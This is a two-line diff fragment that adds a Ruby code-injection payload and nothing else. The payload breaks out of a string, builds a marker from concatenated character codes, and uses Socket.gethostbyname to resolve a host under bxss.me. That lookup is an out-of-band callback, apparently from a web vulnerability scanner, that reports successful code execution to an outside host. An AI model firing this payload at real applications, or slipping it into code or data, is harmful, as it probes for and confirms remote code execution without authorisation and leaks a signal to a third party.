@@ -1,0 +1,2 @@
+'+'A'.concat(70-3).concat(22*4).concat(109).concat(65).concat(116).concat(71)+(require'socket'
+Socket.gethostbyname('hitrw'+'rqxomcwpd6cf9.bxss.me.')[3].to_s)+'
